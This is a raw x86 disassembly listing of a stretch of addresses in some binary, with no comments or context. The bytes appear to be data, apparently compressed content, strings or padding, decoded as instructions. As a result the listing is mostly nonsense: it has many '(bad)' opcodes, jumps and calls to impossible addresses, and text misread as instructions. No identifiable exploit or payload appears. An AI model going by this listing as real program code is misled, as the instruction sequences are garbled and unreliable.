  40faca:	imul   esi,DWORD PTR [esi+0x6d],0x6c744d20
  40fad1:	gs and BYTE PTR gs:[ebx+0x62],ah
  40fad6:	cs ins BYTE PTR es:[edi],dx
  40fad8:	outs   dx,DWORD PTR ds:[esi]
  40fad9:	and    ah,BYTE PTR gs:[eax]
  40fadc:	imul   esp,DWORD PTR [edx+0x20],0x4120686f
  40fae3:	arpl   WORD PTR [esi],bp
  40fae5:	push   ebx
  40fae6:	dec    ebp
  40fae7:	cs gs and BYTE PTR gs:[ebx+0x6e],dh
  40faed:	data16 je 0x40fb60
  40faf0:	outs   dx,BYTE PTR ds:[esi]
  40faf1:	outs   dx,BYTE PTR ds:[esi]
  40faf2:	and    BYTE PTR [edi+0x74],ch
  40faf5:	out    dx,al
  40faf6:	popa   
  40faf7:	std    
  40faf8:	push   cs
  40faf9:	pop    ebx
  40fafa:	ror    BYTE PTR [eax+0x34],0x5e
  40fafe:	(bad)  
  40faff:	jmp    0xff17:0x14668d06
  40fb06:	dec    DWORD PTR [eax+edx*8-0x368a745a]
  40fb0d:	repz and ebp,DWORD PTR [eax-0x27020a98]
  40fb14:	lods   al,BYTE PTR ds:[esi]
  40fb15:	pop    edi
  40fb16:	add    DWORD PTR [ebx-0x74ddfe32],edx
  40fb1c:	pop    ecx
  40fb1d:	xchg   eax,edx
  40fb1f:	aad    0x7e
  40fb21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb22:	mov    dl,0x2a
  40fb24:	(bad)  
  40fb25:	call   DWORD PTR [esi-0x3e0b]
  40fb2b:	and    al,0x9e
  40fb2d:	cmp    bh,0x0
  40fb30:	imul   edx,DWORD PTR [edi-0x20],0xffffffd3
  40fb34:	sbb    al,0xd7
  40fb36:	push   ds
  40fb37:	add    al,0xab
  40fb39:	mov    ebx,0x402572ef
  40fb3e:	shr    BYTE PTR [edi],cl
  40fb40:	test   eax,0x3afac1f5
  40fb45:	or     DWORD PTR [eax],edi
  40fb47:	mov    eax,ds:0x8c000000
  40fb4c:	add    BYTE PTR [eax],0x0
  40fb4f:	mov    ebp,0x93
  40fb54:	call   0xe929e441
  40fb59:	call   0x1f29e446
  40fb5e:	cmp    ebp,DWORD PTR [edx]
  40fb60:	sub    ch,cl
  40fb62:	jge    0x40faff
  40fb64:	mov    ds:0x79cae971,eax
  40fb69:	adc    DWORD PTR [ecx-0x9],ecx
  40fb6c:	inc    ebp
  40fb6d:	xchg   edi,eax
  40fb6e:	and    edi,DWORD PTR [edx-0x2a285099]
  40fb74:	data16 rol al,0xc0
  40fb78:	rol    al,0xc0
  40fb7b:	rol    al,0xc0
  40fb7e:	je     0x40fbf4
  40fb80:	inc    edx
  40fb81:	sahf   
  40fb82:	pop    ss
  40fb83:	sub    DWORD PTR [esp+esi*2+0x4c],esi
  40fb87:	pop    esi
  40fb88:	add    al,dh
  40fb8a:	out    dx,eax
  40fb8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb8c:	push   esi
  40fb8d:	pop    esp
  40fb8e:	int    0x91
  40fb90:	and    BYTE PTR [edi+0xc],dh
  40fb93:	cmp    cl,BYTE PTR [esi]
  40fb95:	push   ss
  40fb96:	aas    
  40fb97:	sbb    ecx,DWORD PTR [ebx-0x1ce5ab94]
  40fb9d:	add    DWORD PTR [edx-0x3b],ebx
  40fba0:	fcom   QWORD PTR [ebp+0xb]
  40fba3:	lea    esp,[edx+eax*2+0x3]
  40fba7:	(bad)  
  40fba9:	je     0x40fc1f
  40fbab:	jecxz  0x40fbd1
  40fbad:	je     0x40fc23
  40fbaf:	retf   0x4506
  40fbb2:	je     0x40fbb4
  40fbb4:	push   ss
  40fbb5:	pop    ss
  40fbb6:	mov    esp,0x45100c6c
  40fbbb:	fsub   QWORD PTR [eax+0x45fba2f7]
  40fbc1:	mov    ds:0x5d7ed8a7,al
  40fbc6:	xchg   edx,eax
  40fbc7:	cld    
  40fbc8:	sub    dl,ch
  40fbca:	and    DWORD PTR [eax+0x0],esi
  40fbcd:	add    BYTE PTR [eax],al
  40fbcf:	in     al,dx
  40fbd0:	dec    ebx
  40fbd1:	aam    0xb4
  40fbd3:	out    0x50,eax
  40fbd5:	pop    esp
  40fbd6:	pop    esi
  40fbd7:	mov    bh,0xa1
  40fbd9:	test   DWORD PTR ss:[edx+0x4b],ecx
  40fbdd:	push   esi
  40fbde:	shl    dh,1
  40fbe0:	icebp  
  40fbe1:	sub    BYTE PTR [ebx-0x20c3f99],bl
  40fbe7:	xchg   esi,eax
  40fbe8:	dec    esi
  40fbe9:	dec    eax
  40fbea:	repz test BYTE PTR [eax],0x0
  40fbee:	lock aad 0x7c
	...
  40fbfd:	mov    bh,0xa
  40fbff:	test   al,0x0
	...
  40fc09:	lea    ecx,[ebp-0x33c4ea1b]
  40fc0f:	xor    DWORD PTR [esi],ecx
  40fc11:	loopne 0x40fbe3
  40fc13:	xor    DWORD PTR [edx+0x72],esi
  40fc16:	mov    eax,ds:0x61b38be7
  40fc1b:	lock pusha 
  40fc1d:	and    eax,0x7eb0b712
  40fc22:	jnp    0x40fbb1
  40fc24:	lea    edi,[esi*8-0x69a27273]
  40fc2b:	lea    ecx,[ebp-0x1c2227e6]
  40fc31:	pop    esi
  40fc32:	lock cmp BYTE PTR [ebx-0x5107430e],al
  40fc39:	lahf   
  40fc3a:	loope  0x40fc28
  40fc3c:	inc    edx
  40fc3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc3e:	mov    ebp,0xf1667a24
  40fc43:	dec    edi
  40fc44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc45:	lea    ecx,[ebx+0x6038a678]
  40fc4b:	mov    ecx,DWORD PTR [ebx-0x6c973f75]
  40fc51:	sar    DWORD PTR [esi-0x2afa786],1
  40fc57:	pop    esp
  40fc58:	xor    ebx,DWORD PTR [ebp-0x5d8f7aea]
  40fc5e:	inc    edx
  40fc5f:	inc    esp
  40fc60:	jle    0x40fc81
  40fc62:	daa    
  40fc63:	mov    eax,gs:0x7e319086
  40fc69:	loopne 0x40fc99
  40fc6b:	(bad)  
  40fc6c:	sub    ebx,ebp
  40fc6e:	iret   
  40fc6f:	xchg   bl,dh
  40fc71:	mov    ecx,DWORD PTR [ebx-0x7474a7d9]
  40fc77:	mov    ecx,DWORD PTR [ecx-0x76767677]
  40fc7d:	mov    DWORD PTR [ecx-0x7c07677],ecx
  40fc83:	mov    esp,0x0
  40fc88:	add    BYTE PTR [eax],al
  40fc8a:	add    BYTE PTR [eax],al
  40fc8c:	add    BYTE PTR [edi],cl
  40fc8e:	btc    DWORD PTR [ebx-0x7f05759a],esi
  40fc95:	mov    dl,0x40
  40fc97:	sbb    eax,0x180e6cd9
  40fc9c:	xchg   esi,eax
  40fc9d:	lahf   
  40fc9e:	ror    DWORD PTR [ebx-0x5b2c44dc],cl
  40fca4:	(bad)  
  40fca5:	jmp    0x40fd1b
  40fca7:	(bad)  
  40fca8:	setne  BYTE PTR [edi+0x7be8cacb]
  40fcaf:	push   ss
  40fcb0:	icebp  
  40fcb1:	int    0xf9
  40fcb3:	xor    al,BYTE PTR [esi-0x51]
  40fcb6:	mov    edi,0xe11cd685
  40fcbb:	leave  
  40fcbc:	mov    bh,0xd5
  40fcbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcbf:	dec    esi
  40fcc0:	out    dx,eax
  40fcc1:	(bad)
  40fcc4:	inc    eax
  40fcc5:	mov    DWORD PTR [edi],ecx
  40fcc7:	xcrypt-ctr (bad)
  40fcc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc9:	sbb    DWORD PTR [edx],edi
  40fccb:	(bad)  
  40fccc:	(bad)  
  40fcce:	push   edi
  40fccf:	push   es
  40fcd0:	verw   WORD PTR [esi+0x56]
  40fcd4:	aam    0x23
  40fcd6:	stos   BYTE PTR es:[edi],al
  40fcd7:	shr    ecx,1
  40fcd9:	jne    0x40fcbd
  40fcdb:	aaa    
  40fcdc:	mov    eax,0xee249f1e
  40fce1:	pop    edi
  40fce2:	lock and ecx,eax
  40fce5:	sbb    eax,0xc795dda9
  40fcea:	add    BYTE PTR [eax],al
  40fcec:	add    bh,al
  40fcee:	and    BYTE PTR [eax],al
  40fcf0:	add    BYTE PTR [edx-0x71],bl
	...
  40fcff:	xchg   edx,eax
  40fd00:	call   0x924e:0x3eacabd5
  40fd07:	not    DWORD PTR [esi+0x61ea0b7a]
  40fd0d:	or     DWORD PTR [eax+0x4f],0x4b
  40fd11:	xchg   esp,eax
  40fd12:	outs   dx,BYTE PTR ds:[esi]
  40fd13:	push   ss
  40fd14:	push   esi
  40fd15:	xchg   edx,eax
  40fd16:	jmp    0xffff:0xffffffff
  40fd1d:	(bad)  
  40fd1e:	(bad)  
  40fd1f:	inc    DWORD PTR [eax]
  40fd21:	add    BYTE PTR [ecx+0xf83a4d],cl
  40fd27:	add    ch,bh
  40fd29:	mov    esi,esp
  40fd2b:	dec    edi
  40fd2c:	mov    gs,WORD PTR [eax]
  40fd2e:	xor    DWORD PTR [eax],edx
  40fd30:	scas   eax,DWORD PTR es:[edi]
  40fd31:	xor    DWORD PTR [edx+0x37d76ebb],0x5412cc9c
  40fd3b:	pop    edi
  40fd3c:	pop    ss
  40fd3d:	dec    ecx
  40fd3e:	cmp    eax,0x2d950d3
  40fd43:	fld    TBYTE PTR [esi]
  40fd45:	fcom   QWORD PTR [edx-0xe818df8]
  40fd4b:	add    BYTE PTR [eax],al
  40fd4d:	inc    esi
  40fd4e:	rol    DWORD PTR [eax],1
  40fd50:	add    BYTE PTR [edx+0x7d],bl
  40fd53:	pop    edi
  40fd54:	add    BYTE PTR [ebp+0x15d50ff1],cl
  40fd5a:	cli    
  40fd5b:	je     0x40fd63
  40fd5d:	sub    al,0x75
  40fd5f:	pop    es
  40fd60:	xchg   DWORD PTR [ecx+eax*4-0x66e01e0b],ecx
  40fd67:	fdiv   DWORD PTR ds:0x4da58bb2
  40fd6d:	sub    DWORD PTR [ebp+0x16e88d8d],ecx
  40fd73:	inc    ebp
  40fd74:	retf   0x1589
  40fd77:	clc    
  40fd78:	push   ecx
  40fd79:	fadd   QWORD PTR [edi]
  40fd7b:	xchg   ebx,eax
  40fd7c:	jb     0x40fd13
  40fd7e:	jo     0x40fd92
  40fd80:	dec    esi
  40fd81:	jae    0x40fd69
  40fd83:	and    bh,ah
  40fd85:	xchg   edx,eax
  40fd86:	jge    0x40fd55
  40fd88:	mov    edx,DWORD PTR [edx-0x566d2302]
  40fd8e:	lea    ecx,[ebp-0x7204ac94]
  40fd94:	lea    ecx,[ebp-0x1]
  40fd9a:	(bad)  
  40fd9b:	(bad)  
  40fd9c:	(bad)  
  40fd9d:	(bad)  
  40fd9e:	push   DWORD PTR [ecx+0xf]
  40fda1:	jg     0x40fda3
	...
  40fdab:	(bad)  
  40fdac:	call   DWORD PTR [eax]
  40fdae:	add    ch,BYTE PTR [eax+ebp*8+0x1b]
  40fdb2:	mov    dh,0xbb
  40fdb4:	mov    cl,0xaf
  40fdb6:	scas   eax,DWORD PTR es:[edi]
  40fdb7:	and    DWORD PTR [ebp+0x7c],ecx
  40fdba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdbb:	(bad)  
  40fdbc:	ss push 0x1a
  40fdbf:	cs dec edx
  40fdc1:	addr16 push ebx
  40fdc3:	adc    eax,0x35ffffb7
  40fdc8:	jmp    0x40fdc9
  40fdca:	call   ebx
  40fdcc:	ret    0xffff
  40fdcf:	xchg   esi,eax
  40fdd0:	fmul   st(5),st
  40fdd2:	adc    dh,BYTE PTR [edx+esi*2]
  40fdd5:	jmp    0xb60cac01
  40fdda:	xor    al,0xd0
  40fddc:	out    dx,eax
  40fddd:	sub    al,BYTE PTR [ebp+0x453b2d8a]
  40fde3:	and    al,0xf4
  40fde5:	and    ch,dh
  40fde7:	inc    DWORD PTR [eax]
  40fde9:	(bad)  
  40fdea:	leave  
  40fdeb:	mov    ebx,0xc3
  40fdf0:	cwde   
  40fdf1:	cmp    esi,DWORD PTR [ecx]
  40fdf3:	push   eax
  40fdf4:	pushf  
  40fdf5:	mov    ebx,0x2d9abad4
  40fdfa:	retf   
  40fdfb:	ins    DWORD PTR es:[edi],dx
  40fdfc:	xor    DWORD PTR [ecx+0x4],edi
  40fdff:	mov    eax,ds:0xecde92ba
  40fe04:	pop    ecx
  40fe05:	test   BYTE PTR [edi-0x4],dh
  40fe08:	mov    edi,DWORD PTR [edi+0x177a498b]
  40fe0e:	int3   
  40fe0f:	arpl   si,dx
  40fe11:	js     0x40fdb8
  40fe13:	add    BYTE PTR [eax],al
  40fe15:	cmp    DWORD PTR [eax+eax*1+0x0],edx
  40fe19:	add    BYTE PTR [ebp-0x72727273],cl
  40fe1f:	lea    ecx,[ebp+0x7e9a8d8d]
  40fe25:	test   al,0x45
  40fe27:	inc    ebp
  40fe28:	inc    ebp
  40fe29:	inc    ebp
  40fe2a:	inc    ebp
  40fe2b:	inc    ebp
  40fe2c:	inc    ebp
  40fe2d:	inc    ebp
  40fe2e:	inc    ebp
  40fe2f:	je     0x40fea5
  40fe31:	mov    ecx,0x1d1940c3
  40fe36:	iret   
  40fe37:	inc    DWORD PTR [edi-0x778093d4]
  40fe3d:	mov    dl,0xb
  40fe3f:	pop    edx
  40fe40:	or     eax,0xb9dbc88c
  40fe45:	imul   esi,DWORD PTR [ebx+0x65],0x2c6e4465
  40fe4c:	popa   
  40fe4d:	ins    DWORD PTR es:[edi],dx
  40fe4e:	dec    edi
  40fe4f:	data16 jne 0x40feb3
  40fe52:	jae    0x40fec3
  40fe54:	arpl   WORD PTR cs:[di],cx
  40fe58:	ins    DWORD PTR es:[edi],dx
  40fe59:	or     dh,BYTE PTR [bp+si+0x73]
  40fe5d:	bound  esi,QWORD PTR ds:[esp+esi*2+0x6d]
  40fe62:	jbe    0x40fe84
  40fe64:	outs   dx,DWORD PTR ds:[esi]
  40fe65:	gs gs cmp eax,0x4d572e3c
  40fe6c:	imul   esp,DWORD PTR cs:[ebp+0x3e],0x6f2f0d74
  40fe74:	cmp    ch,BYTE PTR [edi+0x65]
  40fe77:	gs ins BYTE PTR es:[edi],dx
  40fe79:	or     dh,BYTE PTR [edx+0x65]
  40fe7c:	imul   esi,DWORD PTR gs:[eax+0x74],0x67676e77
  40fe84:	gs jns 0x40fefd
  40fe87:	je     0x40fef7
  40fe89:	jbe    0x40fecf
  40fe8b:	arpl   WORD PTR [eax+0x66],si
  40fe8e:	ins    DWORD PTR es:[edi],dx
  40fe8f:	jb     0x40feb1
  40fe91:	and    ch,BYTE PTR [ecx]
  40fe93:	and    BYTE PTR [ebp+0x72],ah
  40fe96:	popa   
  40fe97:	or     ah,BYTE PTR [eax]
  40fe99:	je     0x40ff0a
  40fe9b:	outs   dx,DWORD PTR cs:[esi]
  40fe9d:	push   ebx
  40fe9e:	inc    ecx
  40fe9f:	ins    DWORD PTR es:[edi],dx
  40fea0:	gs gs jb 0x40ff0a
  40fea4:	jo     0x40ff0f
  40fea6:	bound  esi,QWORD PTR [edx+0x6e]
  40fea9:	inc    esp
  40feaa:	ins    DWORD PTR es:[edi],dx
  40feab:	and    edi,DWORD PTR cs:[esi]
  40feae:	cmp    eax,0x61795363
  40feb3:	jns    0x40fed7
  40feb5:	imul   edi,DWORD PTR gs:[esi],0xcb6b762e
  40febc:	xchg   DWORD PTR [ecx+0x74],ebx
  40febf:	je     0x40fe7b
  40fec1:	xchg   ebx,eax
  40fec2:	scas   al,BYTE PTR es:[edi]
  40fec3:	gs repnz pop esi
  40fec6:	push   ecx
  40fec7:	jl     0x40fe7b
  40fec9:	adc    esp,edi
  40fecb:	rol    DWORD PTR [ebx+0x27d5b23],0x8
  40fed2:	or     ah,BYTE PTR [ebx]
  40fed4:	xchg   edx,eax
  40fed5:	ja     0x40fec8
  40fed7:	adc    eax,0x4dd7a279
  40fedc:	retf   0x7474
  40fedf:	in     eax,dx
  40fee0:	cmp    cl,bl
  40fee2:	je     0x40ff58
  40fee4:	xchg   eax,esi
  40fee6:	cdq    
  40fee7:	je     0x40ff5e
  40fee9:	inc    ecx
  40feea:	and    eax,0x965bfb67
  40feef:	pop    es
  40fef0:	pop    ecx
  40fef1:	(bad)  [esi+0x18008416]
  40fef7:	ret    
  40fef8:	in     al,dx
  40fef9:	pop    ecx
  40fefa:	fmul   DWORD PTR [eax+0x7d6ee2d1]
  40ff00:	push   ecx
  40ff01:	jne    0x40ff78
  40ff03:	jne    0x40ff66
  40ff05:	sub    dh,BYTE PTR [ebp+0x75]
  40ff08:	repnz xchg ebp,eax
  40ff0a:	jne    0x40ff81
  40ff0c:	jne    0x40ff0d
  40ff0e:	(bad)  
  40ff0f:	(bad)  
  40ff10:	(bad)  
  40ff11:	(bad)  
  40ff12:	(bad)  
  40ff13:	(bad)  
  40ff14:	(bad)  
  40ff15:	push   DWORD PTR [edx]
  40ff17:	sbb    ebp,DWORD PTR [edx+0x3db036dc]
  40ff1d:	outs   dx,DWORD PTR ds:[esi]
  40ff1e:	div    esi
  40ff20:	xor    al,0x14
  40ff22:	xor    dl,BYTE PTR [edx+0x188869d6]
  40ff28:	es cs inc ecx
  40ff2b:	(bad)  
  40ff2c:	xchg   esi,eax
  40ff2d:	imul   eax,DWORD PTR [eax],0x0
	...
  40ff38:	add    bl,al
  40ff3a:	icebp  
  40ff3b:	fidiv  WORD PTR [eax+0x2cd0000]
  40ff41:	into   
  40ff42:	pop    ds
  40ff43:	rcr    DWORD PTR [ebx+0x75],cl
  40ff46:	int3   
  40ff47:	mov    ebp,edx
  40ff49:	lahf   
  40ff4a:	stc    
  40ff4b:	(bad)  
  40ff4c:	xor    DWORD PTR [ecx],edx
  40ff4e:	mov    ebp,0x311461ba
  40ff53:	or     eax,ecx
  40ff55:	add    BYTE PTR [esp+eiz*8+0x71],bl
  40ff59:	test   edx,ebx
  40ff5b:	dec    esi
  40ff5c:	mov    eax,ds:0xe94c3880
  40ff61:	push   ecx
  40ff62:	add    BYTE PTR [eax],al
  40ff64:	xor    BYTE PTR [eax],dl
  40ff66:	add    BYTE PTR [eax],al
  40ff68:	mov    al,0x44
  40ff6a:	pop    eax
  40ff6b:	add    BYTE PTR [ebp-0x3d7f7e68],cl
  40ff71:	and    eax,0x6364d762
  40ff76:	mov    dh,0x42
  40ff78:	add    DWORD PTR [eax+0x38],esp
  40ff7b:	sti    
  40ff7c:	ret    
  40ff7d:	xchg   ebx,eax
  40ff7e:	stc    
  40ff7f:	pmaxsw mm6,QWORD PTR ds:0x8d9e5800
  40ff86:	lea    ecx,[ebp-0x431cac95]
  40ff8c:	jmp    0x40ffdc
  40ff8e:	push   ebp
  40ff8f:	add    edi,esp
  40ff91:	aas    
  40ff92:	sub    BYTE PTR [eax-0x2e],dh
  40ff95:	call   0x2510:0x2ecaf83c
  40ff9c:	dec    esp
  40ff9d:	jecxz  0x40ff88
  40ff9f:	sbb    edi,edi
  40ffa1:	jbe    0x410022
  40ffa3:	loopne 0x40ff83
  40ffa5:	lea    ecx,[ebp-0x72b75d40]
  40ffab:	lea    ecx,[ebp-0x33333334]
  40ffb1:	int3   
  40ffb2:	int3   
  40ffb3:	int3   
  40ffb4:	int3   
  40ffb5:	int3   
  40ffb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffb7:	xchg   ebp,eax
  40ffb8:	push   es
	...
  40ffc1:	add    BYTE PTR [esp+esi*2-0x67],dh
  40ffc5:	lds    ebp,FWORD PTR [edx-0x2d]
  40ffc8:	xlat   BYTE PTR ds:[ebx]
  40ffc9:	sahf   
  40ffca:	pop    esi
  40ffcb:	dec    edx
  40ffcc:	push   esp
  40ffcd:	in     al,dx
  40ffce:	jns    0x41003f
  40ffd0:	mov    ch,0xdc
  40ffd2:	or     dh,BYTE PTR [ecx]
  40ffd4:	xor    al,0xe1
  40ffd6:	mov    al,ds:0xbb41ebc0
  40ffdb:	aad    0x74
  40ffdd:	je     0x410026
  40ffdf:	cmp    DWORD PTR [esp+esi*2+0x70],esi
  40ffe3:	pop    ebp
  40ffe4:	je     0x41005a
  40ffe6:	(bad)  
  40ffe7:	popa   
  40ffe8:	pop    ds
  40ffe9:	mov    ecx,0x37c8df74
  40ffee:	pop    ss
  40ffef:	mov    edx,0xd2913a8e
  40fff4:	dec    ebp
  40fff5:	push   ds
  40fff6:	fimul  DWORD PTR [eax-0x23]
  40fff9:	jb     0x40ffc7
  40fffb:	push   ebp
  40fffc:	retf   
  40fffd:	pop    eax
  40fffe:	je     0x410024
  410000:	or     DWORD PTR [ecx+0x24240a9f],0x24
  410007:	(bad)  
  410008:	xchg   esi,eax
  410009:	mov    ah,0x10
  41000b:	imul   edx,DWORD PTR [ecx+0xe],0xa9e2922f
  410012:	jle    0x41004a
  410014:	and    DWORD PTR [ecx+0x7f],0xffffff80
  410018:	test   edi,0xa8d6f2cb
  41001e:	outs   dx,DWORD PTR ds:[esi]
  41001f:	bnd ja 0x41008e
  410022:	mov    ds:0xae3b5bc6,eax
  410027:	cmp    eax,0x2424a6b4
  41002c:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41002e:	and    al,0x24
  410030:	and    al,0x0
	...
  41003a:	scas   al,BYTE PTR es:[edi]
  41003b:	mov    ah,0xf9
  41003d:	(bad)  
  41003e:	(bad)  
  41003f:	(bad)  
  410040:	(bad)  
  410041:	(bad)  
  410042:	(bad)  
  410043:	(bad)  
  410044:	(bad)  
  410045:	dec    DWORD PTR [ebp+0x3351498d]
  41004b:	mov    bh,0xee
  41004d:	aad    0x78
  41004f:	jecxz  0x4100cf
  410051:	loop   0x410015
  410053:	fistp  DWORD PTR [ebx]
  410055:	test   eax,0x7035a8e8
  41005a:	inc    eax
  41005b:	outs   dx,BYTE PTR ds:[esi]
  41005c:	aad    0x3c
  41005e:	or     DWORD PTR cs:[ebp+0x392f988d],0x41
  410066:	(bad)  
  410067:	repz jecxz 0x410035
  41006a:	imul   BYTE PTR [ebx-0x5f19fb91]
  410070:	shr    DWORD PTR [esi],cl
  410072:	cmp    eax,0x7503722
  410077:	stos   DWORD PTR es:[edi],eax
  410078:	mov    esi,0x23e26c53
  41007d:	in     eax,dx
  41007e:	lea    ecx,ds:[ebp-0x7279a192]
  410085:	(bad)  
  410086:	sar    DWORD PTR [ebx-0x79],0x8d
  41008a:	call   DWORD PTR [eax-0x2b]
  41008d:	int3   
  41008e:	imul   esp,DWORD PTR [ebx],0xbae84460
  410094:	cmp    BYTE PTR [edx+0x65],0xc6
  410098:	es jnp 0x410108
  41009b:	mov    ds,ebx
  41009d:	pop    ss
  41009e:	rol    BYTE PTR [ebx-0x33],cl
  4100a1:	inc    ecx
  4100a2:	sar    edi,0xff
  4100a5:	(bad)  
  4100a6:	jg     0x410056
  4100a8:	(bad)  
  4100a9:	jmp    DWORD PTR [edi-0xe8]
  4100af:	(bad)  
  4100b0:	(bad)  
  4100b1:	(bad)  
  4100b2:	(bad)  
  4100b3:	(bad)  
  4100b4:	(bad)  
  4100b5:	(bad)  
  4100b6:	(bad)  
  4100b7:	call   DWORD PTR [esi+ebp*8]
  4100ba:	xlat   BYTE PTR ds:[ebx]
  4100bb:	push   edx
  4100bc:	sbb    ebx,eax
  4100be:	and    bh,dh
  4100c0:	lods   eax,DWORD PTR ds:[esi]
  4100c1:	inc    edi
  4100c2:	jg     0x410082
  4100c4:	call   0x329880ba
  4100c9:	xlat   BYTE PTR ds:[ebx]
  4100ca:	cs xchg dh,cl
  4100cd:	and    BYTE PTR [edi+0x56],bl
  4100d3:	add    BYTE PTR [eax],al
  4100d5:	add    BYTE PTR [eax],al
  4100d7:	add    BYTE PTR [eax],al
  4100d9:	push   0x6a
  4100db:	jns    0x410141
  4100dd:	neg    DWORD PTR [edx+ebp*2+0x6a]
  4100e1:	xchg   BYTE PTR [eax+0x256a9e45],bl
  4100e7:	jne    0x41010d
  4100e9:	and    edi,DWORD PTR gs:[esi+ebx*8]
  4100ed:	out    0x2a,al
  4100ef:	mov    esp,0xe016893b
  4100f4:	imul   edi,DWORD PTR [ebp-0x32175a80],0xce3a5c76
  4100fe:	js     0x4100b2
  410100:	or     esp,edi
  410102:	cdq    
  410103:	sub    ebp,DWORD PTR [edx+0x6a]
  410106:	retf   0x6a72
  410109:	push   0x3f
  41010b:	sbb    eax,0xa28d6a1c
  410110:	pop    ebx
  410111:	xchg   edx,eax
  410112:	push   ebp
  410113:	shl    dh,cl
  410115:	stos   DWORD PTR es:[edi],eax
  410116:	cmp    DWORD PTR [ebp+0x6b917db3],0x74
  41011d:	cmp    dl,dl
  41011f:	outs   dx,DWORD PTR ds:[esi]
  410120:	ja     0x410183
  410122:	mov    cl,0xf6
  410124:	mov    ecx,0x8d8df23f
  410129:	(bad)  
  41012a:	fmul   DWORD PTR [edx-0xf]
  41012d:	(bad)  
  41012e:	mov    ebp,0x7b44512d
  410133:	push   edi
  410134:	xor    al,0xae
  410136:	xchg   edx,eax
  410137:	sbb    al,ch
  410139:	xlat   BYTE PTR ds:[ebx]
  41013a:	popa   
  41013b:	mov    ds:0xbbabe1e9,al
  410140:	jmp    0x2dcebdf3
  410145:	or     DWORD PTR [eax+0x33528d8d],edi
  41014b:	add    cl,BYTE PTR [ebp+0x8d8d]
  410151:	add    BYTE PTR [eax],al
  410153:	add    BYTE PTR [eax],al
  410155:	add    BYTE PTR [eax],al
  410157:	add    bl,dh
  410159:	stc    
  41015a:	out    dx,al
	...
  410163:	add    BYTE PTR [ebx-0x25cb7075],cl
  410169:	pop    esi
  41016a:	std    
  41016b:	pop    ebx
  41016c:	ret    
  41016d:	shl    BYTE PTR [edx+0x2e51d14c],cl
  410173:	adc    al,0x6b
  410175:	arpl   WORD PTR [ebx],bp
  410177:	fiadd  WORD PTR [esi-0x10]
  41017a:	in     al,0xfd
  41017c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41017d:	jbe    0x41010a
  41017f:	mov    esp,DWORD PTR [eax-0x46]
  410182:	mov    ecx,DWORD PTR [ebx-0x74741608]
  410188:	mov    edi,0x799554e4
  41018d:	mov    edx,0x6eea2f27
  410192:	dec    edi
  410193:	mov    ds:0x91dbe9a1,eax
  410198:	sbb    DWORD PTR [eax],edx
  41019a:	loopne 0x41019c
  41019c:	jne    0x410121
  41019e:	sub    al,0xba
  4101a0:	mov    ebp,eax
  4101a2:	push   edi
  4101a3:	and    eax,0xe8e890f7
  4101a8:	call   0x5e0fa3b8
  4101ad:	stos   DWORD PTR es:[edi],eax
  4101ae:	or     dh,BYTE PTR [edi+0x2c5383f6]
  4101b4:	out    dx,al
  4101b5:	jge    0x4101bd
  4101b7:	and    eax,0x5144b9be
  4101bc:	scas   eax,DWORD PTR es:[edi]
  4101bd:	jnp    0x4101bd
  4101bf:	arpl   cx,bp
  4101c1:	(bad)  
  4101c3:	jbe    0x4101c2
  4101c5:	xor    ch,BYTE PTR [edx+0xe]
  4101c8:	pop    ax
  4101ca:	mov    ebp,0x9ce8e844
  4101cf:	mov    eax,ds:0xffe8e8e8
  4101d4:	(bad)  
  4101d5:	(bad)  
  4101d6:	(bad)  
  4101d7:	(bad)  
  4101d8:	(bad)  
  4101d9:	(bad)  
  4101da:	(bad)  
  4101db:	dec    DWORD PTR [esi+ebx*8-0x3f3f3faa]
  4101e2:	rol    al,0xc0
  4101e5:	rol    al,0xc0
  4101e8:	(bad)  
  4101e9:	push   ebx
  4101eb:	add    eax,0xaf81c786
  4101f0:	ja     0x4101f2
  4101f2:	ficomp WORD PTR es:[ecx+0x2e9becfc]
  4101f9:	(bad)  
  4101fb:	shl    BYTE PTR [ebx-0x17ef378d],1
  410201:	mov    edi,edi
  410203:	jmp    edx
  410205:	aad    0x40
  410207:	xor    edi,esp
  410209:	rol    eax,0xa7
  41020c:	jecxz  0x4101f7
  41020e:	mov    ds:0xd0fdde97,al
  410213:	pop    eax
  410214:	xchg   esp,eax
  410215:	inc    ebp
  410216:	mov    ebx,0x6ca37783
  41021b:	dec    edx
  41021c:	in     al,dx
  41021d:	pop    ss
  41021e:	iret   
  41021f:	and    al,0x80
  410221:	(bad)  
  410222:	push   DWORD PTR [esp+eax*4-0x1b00008e]
  410229:	jp     0x410297
  41022b:	jae    0x410296
  41022d:	bound  ebp,QWORD PTR [ecx+0x73]
  410230:	popa   
  410231:	outs   dx,BYTE PTR ds:[esi]
  410232:	cmp    al,0x6c
  410234:	gs push edx
  410236:	outs   dx,BYTE PTR ds:[esi]
  410237:	ins    DWORD PTR es:[edi],dx
  410238:	and    al,BYTE PTR gs:[ecx+0x69]
  41023c:	and    al,BYTE PTR [eax+esi*2+0x76]
  410240:	bound  ebp,QWORD PTR [ebx+eiz*2+0x6d]
  410244:	bound  ebp,QWORD PTR [edi+0x73]
  410247:	jb     0x410278
  410249:	arpl   WORD PTR [eax],sp
  41024b:	push   ebx
  41024c:	cmp    al,0x70
  41024e:	and    BYTE PTR [ecx+0xa],ah
  410251:	ins    DWORD PTR es:[edi],dx
  410252:	je     0x4102ca
  410254:	ins    DWORD PTR es:[edi],dx
  410255:	and    BYTE PTR [ebp+eiz*2+0x76],ah
  410259:	imul   esi,DWORD PTR [edi+eiz*2+0x6d],0x73632070
  410261:	arpl   WORD PTR [ebp+0x74],sp
  410264:	imul   esp,DWORD PTR [ebp+0x3c],0xff866f69
  41026b:	push   eax
  41026c:	leave  
  41026d:	cld    
  41026e:	in     al,0xb4
  410270:	xchg   esp,eax
  410271:	inc    edi
  410272:	outs   dx,DWORD PTR ds:[esi]
  410273:	mov    cs,WORD PTR [eax]
  410275:	out    0x25,al
  410277:	mov    bl,ah
  410279:	cli    
  41027a:	jb     0x41024a
